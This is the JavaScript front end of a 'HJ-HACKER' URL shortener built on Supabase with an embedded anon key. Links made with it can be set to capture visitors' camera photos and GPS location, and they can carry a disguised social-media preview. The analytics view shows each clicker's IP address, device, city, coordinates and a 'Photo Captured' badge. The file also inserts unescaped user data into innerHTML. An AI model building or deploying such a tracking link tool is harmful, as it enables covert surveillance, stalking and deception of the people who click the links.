// HJ-HACKER URL Shortener - Complete Script
// Supabase Configuration
const SUPABASE_URL = "https://mxllockxgmkojcduhcfd.supabase.co";
const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im14bGxvY2t4Z21rb2pjZHVoY2ZkIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzc2OTc5MTcsImV4cCI6MjA5MzI3MzkxN30.GDxGx10lyOf3YkMNytCaltjGf_lQ3LkpNEnzcPQtrsM";

const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

// Global variables
let currentAnalyticsLink = null;
let uploadedImages = [];

// DOM Elements
const tabs = document.querySelectorAll('.nav-btn');
const longUrlInput = document.getElementById('longUrl');
const customCodeInput = document.getElementById('customCode');
const shortenBtn = document.getElementById('shortenBtn');
const passwordToggle = document.getElementById('passwordToggle');
const socialToggle = document.getElementById('socialToggle');
const captureCamera = document.getElementById('captureCamera');
const captureLocation = document.getElementById('captureLocation');
const expiresAt = document.getElementById('expiresAt');
const loadingDiv = document.getElementById('loading');
const errorDiv = document.getElementById('error');
const resultDiv = document.getElementById('result');
const shortLinkSpan = document.getElementById('shortLink');
const copyBtn = document.getElementById('copyBtn');
const qrCodeDiv = document.getElementById('qrCode');

// Helper Functions
function generateShortCode() {
    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let result = '';
    for (let i = 0; i < 6; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
}

function getDeviceId() {
    let deviceId = localStorage.getItem('hj_device_id');
    if (!deviceId) {
        deviceId = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
        localStorage.setItem('hj_device_id', deviceId);
    }
    return deviceId;
}

function showError(message) {
    errorDiv.textContent = message;
    errorDiv.classList.remove('hidden');
    setTimeout(() => {
        errorDiv.classList.add('hidden');
    }, 5000);
}

function showLoading(show) {
    if (show) {
        loadingDiv.classList.remove('hidden');
        shortenBtn.disabled = true;
    } else {
        loadingDiv.classList.add('hidden');
        shortenBtn.disabled = false;
    }
}

function copyToClipboard(text) {
    navigator.clipboard.writeText(text);
    alert('Link copied!');
}

function createQRCode(url) {
    qrCodeDiv.innerHTML = '';
    new QRCode(qrCodeDiv, {
        text: url,
        width: 128,
        height: 128,
        colorDark: "#00ff41",
        colorLight: "#000000"
    });
}

// Save to recent
function saveToRecent(link) {
    let recent = JSON.parse(localStorage.getItem('hj_recent_links') || '[]');
    recent = [link, ...recent.filter(l => l.code !== link.code)].slice(0, 20);
    localStorage.setItem('hj_recent_links', JSON.stringify(recent));
    loadRecentLinks();
}

// Load recent links
function loadRecentLinks() {
    const recent = JSON.parse(localStorage.getItem('hj_recent_links') || '[]');
    const container = document.getElementById('recentList');
    if (!container) return;
    
    if (recent.length === 0) {
        container.innerHTML = '<p style="color: #666; text-align: center;">No recent links</p>';
        return;
    }
    
    container.innerHTML = recent.map(link => `
        <div class="recent-item">
            <div>
                <div class="recent-code">/${link.code}</div>
                <div class="recent-url">${link.longUrl.substring(0, 60)}...</div>
                <div style="font-size: 0.6rem; color: #444; margin-top: 0.2rem;">${new Date(link.date).toLocaleString()}</div>
            </div>
            <div class="recent-actions">
                <button onclick="copyToClipboard('${link.shortUrl}')">Copy</button>
                <button onclick="window.open('${link.shortUrl}', '_blank')">Visit</button>
                <button onclick="viewAnalytics('${link.code}')">Stats</button>
            </div>
        </div>
    `).join('');
}

// View analytics
window.viewAnalytics = async (code) => {
    const domain = window.location.hostname;
    const { data: urlData } = await supabase
        .from('urls')
        .select('id')
        .eq('domain', domain)
        .eq('short_code', code)
        .single();
    
    if (urlData) {
        const { data: analytics } = await supabase
            .from('link_analytics')
            .select('*')
            .eq('url_id', urlData.id)
            .order('created_at', { ascending: false });
        
        showAnalytics(analytics || [], code);
    }
};

// Show analytics
function showAnalytics(analytics, code) {
    const analyticsTab = document.getElementById('analyticsTab');
    const analyticsDetail = document.getElementById('analyticsDetail');
    const analyticsCode = document.getElementById('analyticsCode');
    const statsGrid = document.getElementById('statsGrid');
    const visitorsList = document.getElementById('visitorsList');
    
    analyticsCode.textContent = `Analytics for /${code}`;
    
    const totalClicks = analytics.length;
    const uniqueIPs = new Set(analytics.map(a => a.ip_address)).size;
    const cameras = analytics.filter(a => a.captured_image).length;
    const locations = analytics.filter(a => a.latitude).length;
    
    statsGrid.innerHTML = `
        <div class="stat-card">
            <div class="stat-value">${totalClicks}</div>
            <div class="stat-label">Total Clicks</div>
        </div>
        <div class="stat-card">
            <div class="stat-value">${uniqueIPs}</div>
            <div class="stat-label">Unique Visitors</div>
        </div>
        <div class="stat-card">
            <div class="stat-value">${cameras}</div>
            <div class="stat-label">Photos Captured</div>
        </div>
        <div class="stat-card">
            <div class="stat-value">${locations}</div>
            <div class="stat-label">Locations Tracked</div>
        </div>
    `;
    
    visitorsList.innerHTML = analytics.map(v => `
        <div class="visitor-item">
            <div class="visitor-header">
                <span class="visitor-ip">${v.ip_address || 'Unknown'}</span>
                <span class="visitor-time">${new Date(v.created_at).toLocaleString()}</span>
            </div>
            <div class="visitor-details">
                <span>${v.device_type || 'Unknown'}</span>
                <span>${v.browser || 'Unknown'}</span>
                <span>${v.os || 'Unknown'}</span>
                ${v.city ? `<span>📍 ${v.city}, ${v.country}</span>` : ''}
                ${v.captured_image ? `<span class="visitor-badge">📸 Photo Captured</span>` : ''}
                ${v.latitude ? `<span class="visitor-badge">📍 GPS: ${v.latitude}, ${v.longitude}</span>` : ''}
            </div>
        </div>
    `).join('');
    
    analyticsDetail.classList.remove('hidden');
    
    // Switch to analytics tab
    document.querySelector('[data-tab="analytics"]').click();
}

// Shorten URL function
async function shortenUrl() {
    const longUrl = longUrlInput.value.trim();
    if (!longUrl) {
        showError('Please enter a URL');
        return;
    }
    
    let urlToShorten = longUrl;
    if (!urlToShorten.startsWith('http')) {
        urlToShorten = 'https://' + urlToShorten;
    }
    
    try {
        new URL(urlToShorten);
    } catch {
        showError('Invalid URL');
        return;
    }
    
    const customCode = customCodeInput.value.trim();
    const shortCode = customCode || generateShortCode();
    const hasPassword = passwordToggle.checked;
    const password = hasPassword ? document.getElementById('password').value : null;
    const hasSocialGate = socialToggle.checked;
    const socialIcon = hasSocialGate ? document.getElementById('socialIcon').value : null;
    const socialTitle = hasSocialGate ? document.getElementById('socialTitle').value : null;
    const socialUrl = hasSocialGate ? document.getElementById('socialUrl').value : null;
    const socialDesc = hasSocialGate ? document.getElementById('socialDesc').value : null;
    const socialButton = hasSocialGate ? document.getElementById('socialButton').value : null;
    const animation = document.querySelector('input[name="animation"]:checked').value;
    const cameraCapture = captureCamera.checked;
    const locationCapture = captureLocation.checked;
    const expiryDate = expiresAt.value;
    
    if (hasPassword && !password) {
        showError('Please enter a password');
        return;
    }
    
    if (hasSocialGate && (!socialTitle || !socialUrl)) {
        showError('Please fill social gate details');
        return;
    }
    
    showLoading(true);
    
    try {
        const domain = window.location.hostname;
        const deviceId = getDeviceId();
        
        const { data, error } = await supabase
            .from('urls')
            .insert([{
                domain: domain,
                short_code: shortCode,
                long_url: urlToShorten,
                password: password,
                social_gate_title: socialTitle,
                social_gate_url: socialUrl,
                social_gate_icon: socialIcon,
                social_gate_description: socialDesc,
                social_gate_button_text: socialButton,
                animation_type: animation,
                capture_camera: cameraCapture,
                capture_location: locationCapture,
                expires_at: expiryDate || null,
                device_id: deviceId,
                clicks: 0
            }])
            .select();
        
        if (error) {
            if (error.code === '23505') {
                showError(`Code "${shortCode}" is already taken`);
            } else {
                showError(error.message);
            }
            showLoading(false);
            return;
        }
        
        const shortUrl = `${window.location.origin}/${shortCode}`;
        shortLinkSpan.textContent = shortUrl;
        
        saveToRecent({
            code: shortCode,
            longUrl: urlToShorten,
            shortUrl: shortUrl,
            hasPassword: hasPassword,
            hasSocialGate: hasSocialGate,
            date: new Date().toISOString()
        });
        
        createQRCode(shortUrl);
        resultDiv.classList.remove('hidden');
        
        // Reset form
        longUrlInput.value = '';
        customCodeInput.value = '';
        passwordToggle.checked = false;
        socialToggle.checked = false;
        document.getElementById('passwordSection').classList.add('hidden');
        document.getElementById('socialSection').classList.add('hidden');
        document.getElementById('password').value = '';
        document.getElementById('socialTitle').value = '';
        document.getElementById('socialUrl').value = '';
        captureCamera.checked = false;
        captureLocation.checked = false;
        expiresAt.value = '';
        
    } catch (err) {
        console.error(err);
        showError('An error occurred');
    } finally {
        showLoading(false);
    }
}

// Toggle sections
passwordToggle.addEventListener('change', (e) => {
    const section = document.getElementById('passwordSection');
    if (e.target.checked) {
        section.classList.remove('hidden');
    } else {
        section.classList.add('hidden');
        document.getElementById('password').value = '';
    }
});

socialToggle.addEventListener('change', (e) => {
    const section = document.getElementById('socialSection');
    if (e.target.checked) {
        section.classList.remove('hidden');
    } else {
        section.classList.add('hidden');
    }
});

// Tab switching
tabs.forEach(btn => {
    btn.addEventListener('click', () => {
        const tab = btn.dataset.tab;
        tabs.forEach(b => b.classList.remove('active'));
        btn.classList.add('active');
        
        document.querySelectorAll('.tab').forEach(t => t.classList.add('hidden'));
        document.getElementById(`${tab}Tab`).classList.remove('hidden');
        
        if (tab === 'recent') loadRecentLinks();
        if (tab === 'analytics') loadRecentLinks();
    });
});

// Event listeners
shortenBtn.addEventListener('click', shortenUrl);
copyBtn.addEventListener('click', () => copyToClipboard(shortLinkSpan.textContent));

// Initialize
loadRecentLinks();

console.log('🔥 HJ-HACKER Advanced URL Shortener Ready!');
